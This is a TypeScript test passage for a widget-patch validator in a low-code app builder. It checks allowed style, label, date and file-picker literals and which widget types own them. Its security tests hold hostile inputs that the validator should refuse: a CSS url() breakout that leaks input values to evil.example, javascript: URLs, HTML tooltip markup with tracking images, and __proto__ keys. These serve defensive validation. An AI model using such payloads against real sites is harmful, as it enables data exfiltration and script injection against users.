    expect(table.dynamicBindingPathList).toEqual([]);

    // The exact CSS value is accepted too and round-trips unchanged.
    const exact = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: { borderRadius: "1.5rem", boxShadow: "none" },
        },
      ],
    }).dsl;

    expect(byName(exact, "Banners")).toMatchObject({
      borderRadius: "1.5rem",
      boxShadow: "none",
    });

    // Anything outside the preset table is refused: free CSS, url(), bindings, unknown sizes.
    for (const props of [
      { borderRadius: "10px" },
      { boxShadow: "0 0 0 1px red" },
      { boxShadow: "url(x)" },
      { accentColor: "url(javascript:1)" },
      { accentColor: "{{ appsmith.theme.colors.primaryColor }}" },
      { fontStyle: "BOLD,BOLD,BOLD,BOLD" },
      { fontStyle: "bold" },
      { fontStyle: "UNDERLINE" },
      { delimiter: '"' },
      { delimiter: ",," },
      { textSize: "3rem" },
      { compactMode: "HUGE" },
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Banners", props }],
        }).success,
      ).toBe(false);
    }
  });

  it("sets typography, label, icon, chart, image, date and file-picker literals on their own widget families", () => {
    const { dsl } = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Title",
          props: {
            fontFamily: "Inter",
            fontSize: "1.25rem",
            textAlign: "CENTER",
            fontStyle: "BOLD",
            overflow: "TRUNCATE",
            borderWidth: 1,
            borderColor: "rgba(0, 0, 0, 0.2)",
            disableLink: true,
          },
        },
        {
          kind: "update",
          name: "Email",
          props: {
            label: "Email",
            labelPosition: "Top",
            labelAlignment: "left",
            labelWidth: 5,
            labelTextSize: "0.875rem",
            labelStyle: "BOLD",
            labelTextColor: "#333333",
            tooltip: "Work address",
            maxChars: 120,
            iconName: "envelope",
            iconAlign: "left",
            autoFocus: true,
            rtl: false,
            borderRadius: "none",
          },
        },
        {
          kind: "update",
          name: "Save",
          props: {
            buttonVariant: "SECONDARY",
            placement: "CENTER",
            buttonColor: "#16a34a",
            iconName: "floppy-disk",
            disabledWhenInvalid: true,
            resetFormOnClick: true,
          },
        },
        {
          kind: "update",
          name: "Tags",
          props: {
            labelText: "Tags",
            defaultOptionValue: ["a", "b"],
            allowSelectAll: true,
            isFilterable: true,
          },
        },
        {
          kind: "update",
          name: "StartsAt",
          props: {
            defaultDate: "2026-10-01",
            minDate: "2026-01-01T00:00:00Z",
            maxDate: "2026-12-31",
            firstDayOfWeek: 1,
            timePrecision: "minute",
            closeOnSelection: true,
          },
        },
        {
          kind: "update",
          name: "Upload",
          props: {
            allowedFileTypes: ["image/*", ".png"],
            fileDataType: "Base64",
            maxNumFiles: 3,
            maxFileSize: 10,
            buttonColor: "#000000",
          },
        },
        {
          kind: "update",
          name: "Sales",
          props: {
            xAxisName: "Month",
            yAxisName: "Revenue",
            labelOrientation: "slant",
            showDataPointLabel: true,
            setAdaptiveYMin: true,
          },
        },
        {
          kind: "update",
          name: "Photo",
          props: {
            objectFit: "cover",
            maxZoomLevel: 4,
            enableDownload: true,
            defaultImage: "https://example.com/placeholder.png?v=2",
          },
        },
      ],
    });

    expect(byName(dsl, "Title")).toMatchObject({
      fontFamily: "Inter",
      fontSize: "1.25rem",
      textAlign: "CENTER",
      fontStyle: "BOLD",
      overflow: "TRUNCATE",
      borderWidth: 1,
      borderColor: "rgba(0, 0, 0, 0.2)",
      disableLink: true,
    });
    expect(byName(dsl, "Email")).toMatchObject({
      label: "Email",
      labelPosition: "Top",
      labelWidth: 5,
      labelStyle: "BOLD",
      maxChars: 120,
      iconName: "envelope",
      borderRadius: "0px",
    });
    expect(byName(dsl, "Save")).toMatchObject({
      buttonVariant: "SECONDARY",
      placement: "CENTER",
      buttonColor: "#16a34a",
      iconName: "floppy-disk",
    });
    expect(byName(dsl, "Tags")).toMatchObject({
      labelText: "Tags",
      defaultOptionValue: ["a", "b"],
      allowSelectAll: true,
    });
    expect(byName(dsl, "StartsAt")).toMatchObject({
      defaultDate: "2026-10-01",
      minDate: "2026-01-01T00:00:00Z",
      firstDayOfWeek: 1,
      timePrecision: "minute",
    });
    expect(byName(dsl, "Upload")).toMatchObject({
      allowedFileTypes: ["image/*", ".png"],
      fileDataType: "Base64",
      maxNumFiles: 3,
      maxFileSize: 10,
    });
    expect(byName(dsl, "Sales")).toMatchObject({
      xAxisName: "Month",
      labelOrientation: "slant",
    });
    expect(byName(dsl, "Photo")).toMatchObject({
      objectFit: "cover",
      maxZoomLevel: 4,
      defaultImage: "https://example.com/placeholder.png?v=2",
    });

    // Every literal is a closed value: unknown enum members, out-of-range numbers, impossible dates, non-kebab
    // icon names and bindings are refused by the schema.
    for (const [name, props] of [
      ["Title", { fontFamily: "Comic Sans" }],
      ["Title", { fontSize: "2rem" }],
      ["Title", { borderWidth: 51 }],
      ["Email", { labelPosition: "Bottom" }],
      ["Email", { labelWidth: 65 }],
      ["Email", { maxChars: 0 }],
      ["Email", { iconName: "Envelope" }],
      ["Email", { iconName: "envelope; url(x)" }],
      ["Email", { labelStyle: "BOLD,ITALIC,UNDERLINE" }],
      ["Save", { buttonVariant: "LINK" }],
      ["Save", { tooltip: "{{ x }}" }],
      ["StartsAt", { defaultDate: "2026-02-30" }],
      ["StartsAt", { minDate: "yesterday" }],
      ["StartsAt", { firstDayOfWeek: 7 }],
      ["StartsAt", { timePrecision: "hour" }],
      ["Upload", { allowedFileTypes: [".exe"] }],
      ["Upload", { maxFileSize: 201 }],
      ["Sales", { labelOrientation: "upside-down" }],
      ["Photo", { maxZoomLevel: 3 }],
      ["Photo", { objectFit: "url(x)" }],
    ] as const) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name, props }],
        }).success,
      ).toBe(false);
    }
  });

  it("refuses a family-specific literal on a widget that does not own it, and array/scalar defaults on the wrong select", () => {
    const wrong: [string, Record<string, unknown>, string][] = [
      [
        "Title",
        { maxChars: 5 },
        "'maxChars' can only be set on INPUT_WIDGET_V2",
      ],
      [
        "Email",
        { fontFamily: "Inter" },
        "'fontFamily' can only be set on TEXT_WIDGET",
      ],
      [
        "Save",
        { defaultDate: "2026-01-01" },
        "'defaultDate' can only be set on DATE_PICKER_WIDGET2",
      ],
      [
        "Banners",
        { allowedFileTypes: ["*"] },
        "'allowedFileTypes' can only be set on FILE_PICKER_WIDGET_V2",
      ],
      [
        "Title",
        { canOutsideClickClose: true },
        "'canOutsideClickClose' can only be set on MODAL_WIDGET",
      ],
      [
        "Title",
        { buttonColor: "#000000" },
        "'buttonColor' can only be set on BUTTON_WIDGET / CODE_SCANNER_WIDGET",
      ],
      [
        "Tone",
        { placement: "START" },
        "'placement' can only be set on BUTTON_WIDGET",
      ],
      ["Tone", { defaultOptionValue: ["a"] }, "must be a single option value"],
      [
        "Tags",
        { defaultOptionValue: "a" },
        "must be an array of option values",
      ],
      ["Tone", { labelTooltip: "x", isVisible: true }, ""],
    ];

    for (const [name, props, message] of wrong) {
      const run = () =>
        applyWidgetPatch(widgets(), {
          operations: [{ kind: "update", name, props }],
        });

      if (message === "") expect(run).not.toThrow();
      else expect(run).toThrow(message);
    }
  });

  it("keeps table data-mode, adding-row and search literals on the table only", () => {
    const { dsl } = applyWidgetPatch(widgets(), {
      operations: [
        {
          kind: "update",
          name: "Banners",
          props: {
            primaryColumnId: "id",
            serverSidePaginationEnabled: true,
            enableServerSideFiltering: false,
            defaultSearchText: "active",
            allowAddNewRow: true,
            defaultNewRow: { tone: "INFO", priority: 1, enabled: true },
            canFreezeColumn: true,
            delimiter: "\t",
            inlineEditingSaveOption: "ROW_LEVEL",
            horizontalAlignment: "LEFT",
            verticalAlignment: "CENTER",
            cellBackground: "#ffffff",
            headerTextColor: "#111111",
          },
        },
      ],
    });

    expect(byName(dsl, "Banners")).toMatchObject({
      primaryColumnId: "id",
      serverSidePaginationEnabled: true,
      defaultSearchText: "active",
      defaultNewRow: { tone: "INFO", priority: 1, enabled: true },
      delimiter: "\t",
      inlineEditingSaveOption: "ROW_LEVEL",
    });

    for (const props of [
      { defaultNewRow: { tone: "{{ x }}" } },
      // A wire payload's "__proto__" key is an own key after JSON.parse (an object literal's is not), and both it
      // and "constructor" are prototype names the column-name grammar refuses.
      { defaultNewRow: JSON.parse('{"__proto__": "x"}') },
      { defaultNewRow: { constructor: "x" } },
      { defaultNewRow: { a$b: 1 } },
      { defaultNewRow: { nested: { a: 1 } } },
      { primaryColumnId: "constructor" },
      { delimiter: "" },
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Banners", props }],
        }).success,
      ).toBe(false);
    }
  });
});

describe("applyWidgetPatch — owners cover every buildable widget type", () => {
  it("keeps label / placeholderText / backgroundColor working on the types outside the 18 inventoried ones", () => {
    const dsl = node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      children: [
        node({
          widgetId: "c",
          widgetName: "Price",
          type: "CURRENCY_INPUT_WIDGET",
        }),
        node({ widgetId: "s", widgetName: "Kpi", type: "STATBOX_WIDGET" }),
        node({
          widgetId: "t",
          widgetName: "Tree",
          type: "MULTI_SELECT_TREE_WIDGET",
        }),
        node({ widgetId: "cb", widgetName: "Agree", type: "CHECKBOX_WIDGET" }),
        node({
          widgetId: "j",
          widgetName: "Editor",
          type: "JSON_FORM_WIDGET",
          borderColor: "{{appsmith.theme.colors.primaryColor}}",
          dynamicBindingPathList: [{ key: "borderColor" }],
          dynamicPropertyPathList: [{ key: "borderColor" }],
        }),
      ],
    });
    const { dsl: patched } = applyWidgetPatch(dsl, {
      operations: [
        {
          kind: "update",
          name: "Price",
          props: { label: "Amount", placeholderText: "0.00", tooltip: "USD" },
        },
        { kind: "update", name: "Kpi", props: { backgroundColor: "#fafafa" } },
        {
          kind: "update",
          name: "Tree",
          props: {
            placeholderText: "Pick",
            defaultOptionValue: ["a"],
            labelText: "Tags",
          },
        },
        { kind: "update", name: "Agree", props: { labelPosition: "Right" } },
        { kind: "update", name: "Editor", props: { borderColor: "#111111" } },
      ],
    });
    const byName = (name: string) =>
      patched.children!.find((w) => w.widgetName === name)!;

    expect(byName("Price")).toMatchObject({
      label: "Amount",
      placeholderText: "0.00",
      tooltip: "USD",
    });
    expect(byName("Kpi").backgroundColor).toBe("#fafafa");
    expect(byName("Tree")).toMatchObject({
      placeholderText: "Pick",
      defaultOptionValue: ["a"],
      labelText: "Tags",
    });
    expect(byName("Agree").labelPosition).toBe("Right");
    // A literal clears both the binding list and the JS-mode list.
    expect(byName("Editor").borderColor).toBe("#111111");
    expect(byName("Editor").dynamicBindingPathList).toEqual([]);
    expect(byName("Editor").dynamicPropertyPathList).toEqual([]);

    // Checkbox / switch panes offer only Left / Right.
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          { kind: "update", name: "Agree", props: { labelPosition: "Top" } },
        ],
      }),
    ).toThrow("'labelPosition' on a CHECKBOX_WIDGET must be Left | Right");
    // A statbox has no textColor pane prop; refused with the owners named.
    expect(() =>
      applyWidgetPatch(dsl, {
        operations: [
          { kind: "update", name: "Kpi", props: { textColor: "#000000" } },
        ],
      }),
    ).toThrow("'textColor' can only be set on TABLE_WIDGET_V2 / TEXT_WIDGET");
  });
});

describe("applyWidgetPatch — security review of the audit (image URL, tooltip markup, label position)", () => {
  const dsl = () =>
    node({
      widgetId: "0",
      widgetName: "MainContainer",
      type: "CANVAS_WIDGET",
      children: [
        node({ widgetId: "i", widgetName: "Photo", type: "IMAGE_WIDGET" }),
        node({ widgetId: "b", widgetName: "Save", type: "BUTTON_WIDGET" }),
        node({ widgetId: "e", widgetName: "Email", type: "INPUT_WIDGET_V2" }),
        node({
          widgetId: "d",
          widgetName: "StartsAt",
          type: "DATE_PICKER_WIDGET2",
        }),
        node({ widgetId: "c", widgetName: "Agree", type: "CHECKBOX_WIDGET" }),
        node({ widgetId: "s", widgetName: "On", type: "SWITCH_WIDGET" }),
      ],
    });

  it("refuses an image source that could break out of the widget's CSS url() rule, and normalises the rest", () => {
    const breakout =
      'https://evil.example/x.png?q=") } input[value^="a"] { background: url("https://evil.example/leak?a") } .x { a: url("';

    for (const props of [
      { image: breakout },
      { defaultImage: breakout },
      { image: "https://a.example/x.png' )" },
      { image: "https://a.example/(x).png" },
      { image: "javascript:alert(1)" },
      { image: "data:image/png;base64,iVBORw0KGgo=" },
      { image: "https://user:pw@a.example/x.png" },
      { image: "//a.example/x.png" },
      { image: "{{ Q.data }}" },
    ]) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name: "Photo", props }],
        }).success,
      ).toBe(false);
    }

    const { dsl: patched } = applyWidgetPatch(dsl(), {
      operations: [
        {
          kind: "update",
          name: "Photo",
          props: {
            image: "HTTPS://A.Example/pics/x y.png?q=1",
            defaultImage: "https://a.example/placeholder.png",
          },
        },
      ],
    });

    // WHATWG normalisation: lower-cased scheme/host, percent-encoded space.
    expect(patched.children![0].image).toBe(
      "https://a.example/pics/x%20y.png?q=1",
    );
    expect(patched.children![0].defaultImage).toBe(
      "https://a.example/placeholder.png",
    );
  });

  it("refuses markup in a button or label tooltip", () => {
    for (const [name, props] of [
      ["Save", { tooltip: '<a href="https://evil.example">Reset</a>' }],
      ["Save", { tooltip: "x <img src=https://evil.example/px>" }],
      ["Email", { tooltip: "<b>hi</b>" }],
      ["StartsAt", { labelTooltip: "<i>when</i>" }],
    ] as const) {
      expect(
        widgetPatchSchema.safeParse({
          operations: [{ kind: "update", name, props }],
        }).success,
      ).toBe(false);
    }

    const { dsl: patched } = applyWidgetPatch(dsl(), {
      operations: [
        {
          kind: "update",
          name: "Save",
          props: { tooltip: "Saves the form (Ctrl+S)" },
        },
      ],
    });

    expect(patched.children![1].tooltip).toBe("Saves the form (Ctrl+S)");
  });

  it("narrows labelPosition to what each family's pane offers", () => {
    for (const [name, props] of [
      ["Agree", { labelPosition: "Top" }],
      ["Agree", { labelPosition: "Auto" }],
      ["On", { labelPosition: "Top" }],
      ["Email", { labelPosition: "Right" }],
      ["StartsAt", { labelPosition: "Right" }],
    ] as const) {
      expect(() =>
        applyWidgetPatch(dsl(), {
          operations: [{ kind: "update", name, props }],
        }),
      ).toThrow("'labelPosition' on a");
    }

    expect(() =>
      applyWidgetPatch(dsl(), {
        operations: [
          { kind: "update", name: "Agree", props: { labelPosition: "Right" } },
          { kind: "update", name: "On", props: { labelPosition: "Left" } },
          {
            kind: "update",
            name: "Email",
            props: { labelPosition: "Left", labelAlignment: "right" },
          },
          {
            kind: "update",
            name: "StartsAt",
            props: { labelPosition: "Auto" },
          },
        ],
      }),
    ).not.toThrow();
  });
});

describe("applyWidgetPatch — every owner-guarded literal is refused outside its owners", () => {
  // A sample value per non-trivial key; booleans, enums and numbers are derived from the schema.
  const SAMPLE: Record<string, unknown> = {
    delimiter: ";",
    primaryColumnId: "id",
    defaultNewRow: { a: 1 },
    defaultSelectedRowIndices: [0],
    iconName: "tick",
    labelStyle: "BOLD",
    fontStyle: "BOLD",
    defaultSelectedItem: "x",
    minDate: "2026-01-01",
    maxDate: "2026-01-02",
    defaultDate: "2026-01-03",
    defaultTab: "Tab 1",
    defaultImage: "https://a.example/x.png",
    seriesName: "s",
    xAxisName: "x",
    yAxisName: "y",
    defaultSearchText: "q",
    labelTooltip: "t",
    tooltip: "t",
    placeholderText: "p",
    defaultOptionValue: "v",
    label: "l",
    labelText: "l",
    allowedFileTypes: ["*"],
    minNum: 0,
    maxNum: 1,
    maxZoomLevel: 2,
  };
  const COLORS = new Set([
    "textColor",
    "backgroundColor",
    "oddRowColor",
    "evenRowColor",
    "cellBackground",
    "headerRowColor",
    "headerTextColor",
    "truncateButtonColor",
    "borderColor",
    "accentColor",
    "buttonColor",
    "labelTextColor",
  ]);

  function unwrap(schema: z.ZodTypeAny): z.ZodTypeAny {
    let current = schema;

    while (
      current instanceof z.ZodOptional ||
      current instanceof z.ZodEffects ||
      current instanceof z.ZodPipeline
    ) {
      current =
        current instanceof z.ZodOptional
          ? current.unwrap()
          : current instanceof z.ZodEffects
            ? current.innerType()
            : current._def.in;
    }

    return current;
  }

  function sampleFor(key: string): unknown {
    if (key in SAMPLE) return SAMPLE[key];

    if (COLORS.has(key)) return "#000000";

    const schema = unwrap(
      (
        widgetPropsPatchSchema._def.schema.shape as Record<string, z.ZodTypeAny>
      )[key],
    );

    if (schema instanceof z.ZodBoolean) return true;

    if (schema instanceof z.ZodEnum) return schema.options[0];

    if (schema instanceof z.ZodNumber) return schema.minValue ?? 0;

    return undefined;
  }

  const ALL_TYPES = [
    "TEXT_WIDGET",
    "INPUT_WIDGET_V2",
    "SELECT_WIDGET",
    "MULTI_SELECT_WIDGET_V2",
    "RADIO_GROUP_WIDGET",
    "CHECKBOX_WIDGET",
    "SWITCH_WIDGET",
    "BUTTON_WIDGET",
    "IMAGE_WIDGET",
    "TABLE_WIDGET_V2",
    "CONTAINER_WIDGET",
    "FORM_WIDGET",
    "MODAL_WIDGET",
    "TABS_WIDGET",
    "LIST_WIDGET_V2",
    "DATE_PICKER_WIDGET2",
    "CHART_WIDGET",
    "FILE_PICKER_WIDGET_V2",
    "STATBOX_WIDGET",
    "DIVIDER_WIDGET",
  ];

  it("throws the owners-named error for each key on a widget type outside its owners", () => {
    const unsampled: string[] = [];

    for (const [key, owners] of Object.entries(LITERAL_PROP_OWNERS)) {
      const value = sampleFor(key);

      if (value === undefined) {
        unsampled.push(key);
        continue;
      }

      const outsider = ALL_TYPES.find((type) => !owners.includes(type));

      expect(outsider).toBeDefined();

      const dsl = node({
        widgetId: "0",
        widgetName: "MainContainer",
        type: "CANVAS_WIDGET",
        children: [node({ widgetId: "w", widgetName: "W", type: outsider! })],
      });

      expect(() =>
        applyWidgetPatch(dsl, {
          operations: [{ kind: "update", name: "W", props: { [key]: value } }],
        }),
      ).toThrow(`'${key}' can only be set on`);
    }

    // Every owners entry must have a sample value, so a new key cannot slip out of this check.
    expect(unsampled).toEqual([]);
  });
});

describe("applyWidgetPatch — slider label position is Left | Top", () => {
  it("refuses Auto on a slider and accepts Left / Top", () => {
    const dsl = () =>
      node({
        widgetId: "0",
        widgetName: "MainContainer",
        type: "CANVAS_WIDGET",
        children: [
          node({
            widgetId: "n",
            widgetName: "Qty",
            type: "NUMBER_SLIDER_WIDGET",
          }),
        ],
      });

    expect(() =>
      applyWidgetPatch(dsl(), {
        operations: [
          { kind: "update", name: "Qty", props: { labelPosition: "Auto" } },
        ],
      }),
    ).toThrow("'labelPosition' on a NUMBER_SLIDER_WIDGET must be Left | Top");
    expect(
      applyWidgetPatch(dsl(), {
        operations: [
          { kind: "update", name: "Qty", props: { labelPosition: "Top" } },
        ],
      }).dsl.children![0].labelPosition,
    ).toBe("Top");
  });
});
